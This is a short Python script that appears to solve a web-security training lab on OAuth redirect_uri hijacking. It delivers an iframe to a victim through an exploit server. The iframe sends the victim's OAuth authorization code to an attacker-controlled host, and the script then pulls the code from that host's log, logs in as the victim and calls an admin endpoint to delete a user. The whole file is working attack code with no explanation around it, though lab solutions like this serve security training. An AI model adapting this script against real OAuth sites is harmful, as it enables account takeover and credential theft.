import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

home_url = f'https://{site}/'
resp = s.get(home_url)

soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')
exploit_url = exploit_url.rstrip('/').lstrip('https://')

# Get from auth request during login process
oauth_server_url = ''
client_id = ''

# Upload an iframe with a malicious URL that will log the user's access and auth code
exploit_iframe = f'<iframe src="https://{oauth_server_url}/auth?client_id={client_id}&redirect_uri=https://{exploit_url}&response_type=code&scope=openid%20profile%20email"></iframe>'
formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_iframe,
    'formAction': 'DELIVER_TO_VICTIM'
}
resp = s.post(f'https://{exploit_url}/', data=formData)

# Grab the victim's authentication code from the exploit log
exploit_log = f'https://{exploit_url}/log'
resp = s.get(exploit_log)
log_text = resp.text
code_index = log_text.rfind("code=")
code = log_text[code_index+5:code_index+48]

# Log in as the victim and delete poor Carlos
stolen_url = f'https://{site}/oauth-callback?code={code}'
resp = s.get(stolen_url)
delete_carlos = f'https://{site}/admin/delete?username=carlos'
resp = s.get(delete_carlos)